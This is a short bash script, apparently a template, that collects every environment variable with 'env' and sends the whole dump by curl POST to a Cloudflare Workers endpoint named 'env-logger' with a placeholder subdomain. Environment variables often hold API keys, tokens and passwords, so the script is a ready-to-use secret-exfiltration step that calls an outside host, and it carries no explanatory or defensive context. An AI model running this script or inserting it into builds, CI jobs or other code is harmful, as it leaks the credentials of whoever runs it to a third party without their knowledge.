#!/bin/bash

WORKER_URL="https://env-logger.<your-subdomain>.workers.dev"

env_data=$(env)

curl -s -X POST "$WORKER_URL" -d "$env_data"
